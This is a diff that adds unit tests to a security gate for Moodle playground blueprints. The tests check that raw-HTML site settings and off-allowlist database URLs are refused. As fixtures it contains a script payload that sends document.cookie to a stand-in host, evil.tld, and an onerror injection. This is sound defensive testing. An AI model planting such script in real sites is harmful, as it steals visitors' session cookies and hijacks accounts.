@@ -246,3 +246,60 @@ test("rejected verdicts validate against the closed schema", () => {
     assert.deepEqual(validateVerdict(rejectedVerdict(ec, "", "")), []);
   }
 });
+
+// The gate allowlists step NAMES; setConfig's capability lives in its VALUE.
+// Moodle renders additionalhtmlhead as raw HTML on every page (PARAM_RAW),
+// into an iframe with no sandbox, same-origin with the playground — and the
+// payload need not look like a URL, so every URL sweep misses it.
+test("refuses setConfig of a raw-HTML site config", () => {
+  const b = bp();
+  b.steps.push({
+    step: "setConfig",
+    name: "additionalhtmlhead",
+    value: "<script>fetch('//evil.tld/'+document.cookie)</script>",
+  });
+  const { stepErrors } = gateBlueprint(b, HOSTS);
+  assert.equal(stepErrors.length, 1);
+  assert.match(stepErrors[0], /additionalhtmlhead/);
+});
+
+test("refuses a raw-HTML config hidden in a setConfigs array", () => {
+  const b = bp();
+  b.steps.push({
+    step: "setConfigs",
+    configs: [
+      { name: "debug", value: "32767" },
+      { name: "additionalhtmlfooter", value: "<img src=x onerror=alert(1)>" },
+    ],
+  });
+  assert.match(gateBlueprint(b, HOSTS).stepErrors[0], /additionalhtmlfooter/);
+});
+
+test("the raw-HTML config check is case-insensitive", () => {
+  const b = bp();
+  b.steps.push({ step: "setConfig", name: "AdditionalHtmlTopOfBody", value: "x" });
+  assert.equal(gateBlueprint(b, HOSTS).stepErrors.length, 1);
+});
+
+test("ordinary setConfig values are still allowed", () => {
+  const b = bp();
+  b.steps.push({
+    step: "setConfigs",
+    configs: [{ name: "debug", value: "32767" }, { name: "noemailever", value: "1" }],
+  });
+  assert.equal(gateBlueprint(b, HOSTS).stepErrors.length, 0);
+});
+
+// restoreDatabase is deliberately ALLOWED — the resolved design decision is
+// "allowed under the data-host allowlist", and the nightly canary blueprint
+// uses it. What constrains it is sweepUrls, not the step allowlist.
+test("restoreDatabase is allowed, but its URL must clear the data hosts", () => {
+  const ok = bp();
+  ok.steps.push({ step: "restoreDatabase", url: "https://raw.githubusercontent.com/o/r/s/db.sq3" });
+  assert.equal(gateBlueprint(ok, HOSTS).stepErrors.length, 0);
+  assert.equal(gateBlueprint(ok, HOSTS).urlErrors.length, 0);
+
+  const bad = bp();
+  bad.steps.push({ step: "restoreDatabase", url: "https://evil.tld/db.sq3" });
+  assert.equal(gateBlueprint(bad, HOSTS).urlErrors.length, 1);
+});
